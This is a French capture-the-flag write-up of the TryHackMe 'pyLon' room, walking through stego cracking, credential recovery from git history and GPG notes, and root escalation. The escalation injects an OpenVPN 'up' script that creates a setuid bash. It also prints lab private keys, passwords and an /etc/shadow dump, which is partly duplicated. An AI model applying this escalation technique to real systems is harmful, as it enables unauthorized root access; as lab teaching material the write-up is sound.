# pyLon #

## Task 1 recon ##

**I have extracted the hidden file with steghide.**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ exiftool pepper.jpg 
ExifTool Version Number         : 12.31
File Name                       : pepper.jpg
Directory                       : .
File Size                       : 381 KiB
File Modification Date/Time     : 2021:10:17 16:40:04+02:00
File Access Date/Time           : 2021:10:17 16:42:17+02:00
File Inode Change Date/Time     : 2021:10:17 16:42:17+02:00
File Permissions                : -rwxrwx---
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```

Dans les donées exif il y a un lien.  

![page](./Task1-01.png)    

Le lien nous amène vers une page cyberchef tout faite.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ stegseek pepper.jpg /usr/share/wordlists/rockyou.txt 
StegSeek version 0.5
Progress: 0.69% (964600 bytes)           

[i] --> Found passphrase: "pepper"
[i] Original filename: "lone"
[i] Extracting to "pepper.jpg.out"
```

On force le mot de passe avec stegseek, il trouve le mot de passe lone et extrait le fichier.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat pepper.jpg.out 
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
7Xa73W632+12/5XfActiLj0AKAAA
```

On a un fichier qui est chiffré.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat pepper.jpg.out | base64 -d > decode
tim@kali:~/Bureau/tryhackme/write-up$ file decode
decode: gzip compressed data, from Unix, original size modulo 2^32 10240
```

On le décode en base64.  
On remarque que c'est un fichier gzip.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ tar xvsf decode
lone_id
tim@kali:~/Bureau/tryhackme/write-up$ cat lone_id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw
YJu73+zGO0AoETo8LYhxB5eI5D9KzboGuTDAuGZQuUq+8N/hBmfavieHLHgkRNBr0ErJ60
l2FAcDW6pDowfiwC1vsdixQ6L8kvVhdkz0GUfPAlfIRhHHtQaQnQ7wnRtdGjIPK9/S1MPs
IJOLD2S79NxS7vguw87Mp0cnRjDalaCcRE0ELUvLDKQdZlWba0kF/PciqknkDYq2mbkCRd
3jWX2Umx0WtP2wCh9BQ/syxTJDXn6mCEsoNI/roLKyB1uGms/pFiBxS0qdiZAAO6CyTkyG
hZwb1BKmUwAAA8hSynq9Usp6vQAAAAdzc2gtcnNhAAABAQDjmdWES1Pfuwqc0FYfZVixdu
MDy8Arx7Tgd+uAXTo2IYZCxEEu0nBgm7vf7MY7QCgROjwtiHEHl4jkP0rNuga5MMC4ZlC5
Sr7w3+EGZ9q+J4cseCRE0GvQSsnrSXYUBwNbqkOjB+LALW+x2LFDovyS9WF2TPQZR88CV8
hGEce1BpCdDvCdG10aMg8r39LUw+wgk4sPZLv03FLu+C7DzsynRydGMNqVoJxETQQtS8sM
pB1mVZtrSQX89yKqSeQNiraZuQJF3eNZfZSbHRa0/bAKH0FD+zLFMkNefqYISyg0j+ugsr
IHW4aaz+kWIHFLSp2JkAA7oLJOTIaFnBvUEqZTAAAAAwEAAQAAAQB+u03U2EzfqzqBjtAl
szzrtBM8LdvXhOAGjT+ovkCHm6syyiyxcaP5Zz35tdG7dEHbNd4ETJEDdTFYRpXUb90GiU
sGYpJYWnJvlXmrI3D9qOzvqgYn+xXNaZd9V+5TwIPyKqB2yxFLiQFEujAaRUr2WYPnZ3oU
CZQO7eoqegQFm5FXLy0zl0elAkEiDrrpS5CNBunv297nHMLFBPIEB231MNbYMDe0SU40NQ
WAGELdiAQ9i7N/SMjAJYAV2MAjbbzp5uKDUNxb3An85rUWKHXslATDh25abIY0aGZHLP5x
4B1usmPPLxGTqX19Cm65tkw8ijM6AM9+y4TNj2i3GlQBAAAAgQDN+26ilDtKImrPBv+Akg
tjsKLL005RLPtKQAlnqYfRJP1xLKKz7ocYdulaYm0syosY+caIzAVcN6lnFoBrzTZ23uwy
VB0ZsRL/9crywFn9xAE9Svbn6CxGBYQVO6xVCp+GiIXQZHpY7CMVBdANh/EJmGfCJ/gGby
mut7uOWmfiJAAAAIEA9ak9av7YunWLnDp6ZyUfaRAocSPxt2Ez8+j6m+gwYst+v8cLJ2SJ
duq0tgz7za8wNrUN3gXAgDzg4VsBUKLS3i41h1DmgqUE5SWgHrhIJw9AL1fo4YumPUkB/0
S0QMUn16v4S/fnHgZY5KDKSl4hRre5byrsaVK0oluiKsouR4EAAACBAO0uA2IvlaUcSerC
0OMkML9kGZA7uA52HKR9ZE/B4HR9QQKN4sZ+gOPfiQcuKYaDrfmRCeLddrtIulqY4amVcR
nx3u2SBx9KM6uqA2w80UlqJb8BVyM4SscUoHdmbqc9Wx5f+nG5Ab8EPPq0FNPrzrBJP5m0
43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

On décompresse decode et on obtient lone_id qui est une clef privée.   

## Task 2 pyLon ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.55.164 pylon.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A pylon.thm -p- 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 17:09 CEST
Nmap scan report for pylon.thm (10.10.55.164)
Host is up (0.034s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:9f:ae:2d:f8:af:04:bc:8d:6e:2d:55:66:a8:b7:55 (RSA)
|   256 ce:65:eb:ce:9f:3f:57:16:6a:79:45:9d:d3:d2:eb:f2 (ECDSA)
|_  256 6c:3b:a7:02:3f:a9:cd:83:f2:b9:46:6c:d0:d6:e6:ec (ED25519)
222/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 39:e1:e4:0e:b5:40:8a:b9:e0:de:d0:6e:78:82:e8:28 (RSA)
|   256 c6:f6:48:21:fd:07:66:77:fc:ca:3d:83:f5:ca:1b:a3 (ECDSA)
|_  256 17:a2:5b:ae:4e:44:20:fb:28:58:6b:56:34:3a:14:b3 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/17%OT=22%CT=1%CU=32265%PV=Y%DS=2%DC=T%G=Y%TM=616C3C
OS:C0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST
OS:11NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   32.33 ms 10.9.0.1
2   32.40 ms pylon.thm (10.10.55.164)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.82 seconds

tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 lone_id 

```
Avec nmap on un service SSH sur deux ports, le port 22 et le port 222.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh lone@pylon.thm -i lone_id -p 222

               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key: 
```

On nous demande un clef.  

![page](./Task1-02.png)   
Le clef est : 2_[-I2_[0E2DmEK     

Avec la page trouvée et le mot pepper on arrive sur une autre interface.  

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
        

Select an option [Q] to Quit: 

```

Option 1.   

**What is Flag 1?**  

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm                   lone                        
 [2]     FLAG 1                      FLAG 1                      

Select a password [C] to cancel: 
```

Option 2.  

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for FLAG 1

        Username = FLAG 1
        Password = THM{homebrew_password_manager}            

Press ENTER to continue.
```

On a notre 1er flag.  
Le flag est : THM{homebrew_password_manager}  

**What is User1 flag?**   

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm                   lone                        
 [2]     FLAG 1                      FLAG 1                      

Select a password [C] to cancel: 

               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm

        Username = lone
        Password = +2BRkRuE!w7>ozQ4            

Press ENTER to continue.
```

On faisant option 1 et 1 on trouve les identifiants de lone qui sont : lone:+2BRkRuE!w7>ozQ4  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh lone@pylon.thm 
lone@pylon.thm's password: 
Welcome to
                   /
       __         /       __    __
     /   ) /   / /      /   ) /   )
    /___/ (___/ /____/ (___/ /   /
   /         /
  /      (_ /       by LeonM

lone@pylon:~$ ls
note_from_pood.gpg  pylon  user1.txt
lone@pylon:~$ cat user1.txt 
TMM{easy_does_it}
```

On se connecte sur le shell sur les identifiants trouvés précédemment. 
On lit le fichier user1.txt.   
Le flag est : TMM{easy_does_it}    

**What is User2 flag?**   

```bash
lone@pylon:~$ ls -al
total 48
drwxr-x--- 6 lone lone 4096 Jan 30  2021 .
drwxr-xr-x 5 root root 4096 Jan 30  2021 ..
lrwxrwxrwx 1 lone lone    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lone lone  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 lone lone 3771 Jan 30  2021 .bashrc
drwx------ 2 lone lone 4096 Jan 30  2021 .cache
-rw-rw-r-- 1 lone lone   44 Jan 30  2021 .gitconfig
drwx------ 4 lone lone 4096 Jan 30  2021 .gnupg
drwxrwxr-x 3 lone lone 4096 Jan 30  2021 .local
-rw-r--r-- 1 lone lone  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood  600 Jan 30  2021 note_from_pood.gpg
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 pylon
-rw-r--r-- 1 lone lone   18 Jan 30  2021 user1.txt
```

On voit un fichier .gitconfig, il doit avoir des informations.   

```bash
lone@pylon:~/pylon$ ls -al
total 40
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 .
drwxr-x--- 6 lone lone 4096 Jan 30  2021 ..
drwxrwxr-x 8 lone lone 4096 Jan 30  2021 .git
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rwxrwxr-x 1 lone lone 8413 Jan 30  2021 pyLon.py
-rw-rw-r-- 1 lone lone 2195 Jan 30  2021 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3973 Jan 30  2021 pyLon_db.py
```

Dans pylon, il y a un dépot git.   


```bash
lone@pylon:~/pylon$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
```

D'arpès git log il y a eu plusieurs changements.   

```bash
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 73ba9ed actual release! whoops
HEAD is now at cfc14d5 Initial commit!
lone@pylon:~/pylon$ ls -al
total 52
drwxr-xr-x 3 lone lone  4096 Oct 17 15:37 .
drwxr-x--- 6 lone lone  4096 Jan 30  2021 ..
drwxrwxr-x 8 lone lone  4096 Oct 17 15:37 .git
-rw-rw-r-- 1 lone lone   793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone   340 Jan 30  2021 banner.b64
-rw-rw-r-- 1 lone lone 12288 Oct 17 15:37 pyLon.db
-rw-rw-r-- 1 lone lone  2516 Oct 17 15:37 pyLon_crypt.py
-rw-rw-r-- 1 lone lone  3973 Jan 30  2021 pyLon_db.py
-rw-rw-r-- 1 lone lone 10290 Oct 17 15:37 pyLon_pwMan.py
```

Sur le commit initial nous avons une base de donnée pyLon.db  

```bash
lone@pylon:~/pylon$ python3 pyLon_pwMan.py
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] List passwords.
        [2] Decrypt a password.
        [3] Create new password.
        [4] Delete a password.
        [5] Search passwords.
        [6] Display help menu
        

Select an option [Q] to Quit: 2

               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm_gpg_key           lone_gpg_key                

Select a password [C] to cancel: 1

               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = zr7R0T]6zvYl*~OD            

[*] Install xclip to copy to clipboard.
[*] sudo apt install xclip

[*] Password copied to the clipboard.
```

Avec la nouvelle base de donnée on trouve ce qu'il faut pour décoder la note.    

```bash
lone@pylon:~$ gpg -d note_from_pood.gpg
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is yn0ouE9JLR3h)`=I

Thanks again.
```

On décode la note et on trouve un mot de passe.   

```bash
lone@pylon:~$ ls ../
lone  pood  pylon
lone@pylon:~$ su pood
Password: 
pood@pylon:/home/lone$ cd ../pood
pood@pylon:~$ cat user2.txt 
THM{homebrew_encryption_lol}
```

On voit un utilisateur pood.   
On change d'utilisateur et on lit le fichier user2.txt.   
Le flag est : THM{homebrew_encryption_lol}   

**What is root's flag?**

```bash
pood@pylon:~$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

L'utitlisateur pood peut lire avec les droits root le fichier client.ovpn.   
Le fichier client.ovpn peut exécuter des commandes avec les droits root.   

```bash
pood@pylon:/tmp$ cat bc.sh 
#!/bin/bash
cp /bin/bash /tmp/
chmod 4777 /tmp/bash
pood@pylon:/tmp$ chmod +x bc.sh 
```

On crée un fichier bc.sh qui sera lancé avec client.ovpn.   
Le fichier bc.sh va copier le fichier bash dans tmp et va lui mettre le droit setuid.   

```bash
pood@pylon:/tmp$ sudoedit /opt/openvpn/client.ovpn 
```

On ouvre client.ovpn on ajoute les lignes suivantes :   
script-security 2    
up /tmp/bc.sh    

```bash
pood@pylon:/tmp$ su lone
Password: 

lone@pylon:~$ sudo -l
[sudo] password for lone: 
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

On change d'utilisateur lone. 
lone peut exécuter openvpn.   

```bash
lone@pylon:/tmp$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
Sun Oct 17 16:12:21 2021 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Sun Oct 17 16:12:21 2021 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Sun Oct 17 16:12:21 2021 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
Sun Oct 17 16:12:21 2021 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
Sun Oct 17 16:12:21 2021 UDP link local: (not bound)
Sun Oct 17 16:12:21 2021 UDP link remote: [AF_INET]127.0.0.1:1194
Sun Oct 17 16:12:21 2021 [server] Peer Connection Initiated with [AF_INET]127.0.0.1:1194
Sun Oct 17 16:12:22 2021 TUN/TAP device tun1 opened
Sun Oct 17 16:12:22 2021 do_ifconfig, tt->did_ifconfig_ipv6_setup=0
Sun Oct 17 16:12:22 2021 /sbin/ip link set dev tun1 up mtu 1500
Sun Oct 17 16:12:22 2021 /sbin/ip addr add dev tun1 local 172.31.12.6 peer 172.31.12.5
Sun Oct 17 16:12:22 2021 /tmp/bc.sh tun1 1500 1552 172.31.12.6 172.31.12.5 init
Sun Oct 17 16:12:22 2021 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
Sun Oct 17 16:12:22 2021 Initialization Sequence Completed
^CSun Oct 17 16:12:29 2021 event_wait : Interrupted system call (code=4)
Sun Oct 17 16:12:29 2021 /sbin/ip addr del dev tun1 local 172.31.12.6 peer 172.31.12.5
Sun Oct 17 16:12:29 2021 SIGINT[hard,] received, process exiting

lone@pylon:/tmp$ ls -al bash
-rwsrwxrwx 1 root root 1113504 Oct 17 16:12 bash

bash-4.4# id
uid=1002(lone) gid=1002(lone) euid=0(root) groups=1002(lone)

bash-4.4# cd /root
bash-4.4# ls
root.txt.gpg
bash-4.4# gpg -d root.txt.gpg 
gpg: can't open 'root.txt.gpg': Permission denied
gpg: decrypt_message failed: Permission denied
```

On exécute openvpn avec le fichier client.opvn.   
On lance un shell persistant.   :
Dans le repértoire root on a un fichier root.txt.gpg.   
On essaie de le décoder mais on a pas les bonnes permisions.  

```bash
bash-4.4# cat /etc/shadowbash-4.4# cat /etc/shadow
root:$6$vfrtqwG3$K1wwsz.rtdOBJ.P3vrNwVZN66iMJjTdTRQRIPmJAvXXxqrEk5JRjlRYCdYB44GjwTlJ4n1OcsxX0ntsa8Uue9.:18480:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18657:0:99999:7:::
pylon:$6$kBtkIi0w$zj80m4J62jDhdffz6U.Fy/9rBhfLOD5YybkOXUrwQthF1svHTXfB6wCJ7KaZ9Dl0euJmjFbiIbtQIICIpE04W0:18657:0:99999:7:::
pood:$6$ivWUkR1k$XnYAc7OJJ63P/lgYzNWLiFMydrOFP/qrARMNcjHX1H4sIGFEyVQKAOedWLDY2nHU8rxx7hABmr4JT3uM74Bm5.:18657:0:99999:7:::
lone:$6$vfrtqwG3$K1wwsz.rtdOBJ.P3vrNwVZN66iMJjTdTRQRIPmJAvXXxqrEk5JRjlRYCdYB44GjwTlJ4n1OcsxX0ntsa8Uue9.:18657:0:99999:7:::
:
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18657:0:99999:7:::
pylon:$6$kBtkIi0w$zj80m4J62jDhdffz6U.Fy/9rBhfLOD5YybkOXUrwQthF1svHTXfB6wCJ7KaZ9Dl0euJmjFbiIbtQIICIpE04W0:18657:0:99999:7:::
pood:$6$ivWUkR1k$XnYAc7OJJ63P/lgYzNWLiFMydrOFP/qrARMNcjHX1H4sIGFEyVQKAOedWLDY2nHU8rxx7hABmr4JT3uM74Bm5.:18657:0:99999:7:::
lone:$6$vfrtqwG3$K1wwsz.rtdOBJ.P3vrNwVZN66iMJjTdTRQRIPmJAvXXxqrEk5JRjlRYCdYB44GjwTlJ4n1OcsxX0ntsa8Uue9.:18657:0:99999:7:::
```

On copie le hash dans root.   

```bash
bash-4.4# su
Password: 
root@pylon:~# ls
root.txt.gpg
root@pylon:~# gpg -d root.txt.gpg 
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
ThM{OpenVPN_script_pwn}
```

On s'identifie, on a un vrai compte root.  
On peut décode root.txt.gpg.   
Le flag est :  ThM{OpenVPN_script_pwn}    